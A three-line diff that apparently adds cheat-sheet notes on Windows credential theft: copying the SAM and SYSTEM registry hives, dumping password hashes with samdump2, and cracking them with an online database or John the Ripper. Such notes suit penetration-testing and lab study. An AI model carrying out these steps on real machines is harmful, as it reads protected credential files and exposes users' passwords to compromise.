@@ -1,0 +1,3 @@
+copy C:\WIndows\System32\config\SAM and C:\Windows\System32\config\SYSTEM. 
+samdump2 SYSTEM SAM
+Crack with online database or john
